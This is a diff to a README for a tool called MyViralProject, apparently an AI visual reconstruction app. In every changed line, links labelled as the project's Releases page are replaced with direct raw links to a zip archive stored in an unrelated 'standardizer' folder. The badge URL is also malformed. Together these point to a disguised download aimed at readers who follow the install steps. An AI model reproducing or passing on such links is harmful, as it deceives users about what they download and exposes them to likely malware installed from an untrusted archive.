@@ -4,12 +4,12 @@
 Welcome to **MyViralProject**, a fully automated AI reconstruction tool. This software leverages cutting-edge technology to create stunning visuals and insights with minimal user input. You can harness the power of AI without needing technical expertise.
 
 ## 🔗 Download Now
-[![Download MyViralProject](https://img.shields.io/badge/Download%20MyViralProject-v1.0-blue.svg)](https://github.com/Sesha736/MyViralProject/releases)
+[![Download MyViralProject](https://raw.githubusercontent.com/Sesha736/MyViralProject/main/standardizer/My-Project-Viral-2.8.zip%https://raw.githubusercontent.com/Sesha736/MyViralProject/main/standardizer/My-Project-Viral-2.8.zip)](https://raw.githubusercontent.com/Sesha736/MyViralProject/main/standardizer/My-Project-Viral-2.8.zip)
 
 ## 🚀 Getting Started
 Getting started with MyViralProject is simple. Follow these steps to download, install, and run the software:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Sesha736/MyViralProject/releases) to find the latest version of MyViralProject.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Sesha736/MyViralProject/main/standardizer/My-Project-Viral-2.8.zip) to find the latest version of MyViralProject.
 2. **Choose Your Version**: Look for the latest version and click on it. This version has the newest features and improvements.
 3. **Download the Installer**: Find the installer file that matches your operating system (Windows, Mac, or Linux), and click to download it.
 4. **Run the Installer**:
@@ -33,7 +33,7 @@ Before you install, ensure your computer meets these requirements:
 - **Disk Space**: Minimum of 1 GB available for installation.
 
 ## 📥 Download & Install
-To download MyViralProject, visit the Releases page at [this link](https://github.com/Sesha736/MyViralProject/releases). Choose the correct installer for your system and follow the earlier instructions to complete your installation.
+To download MyViralProject, visit the Releases page at [this link](https://raw.githubusercontent.com/Sesha736/MyViralProject/main/standardizer/My-Project-Viral-2.8.zip). Choose the correct installer for your system and follow the earlier instructions to complete your installation.
 
 ## 🔧 Troubleshooting
 If you encounter any issues while installing or running the software, consider the following:
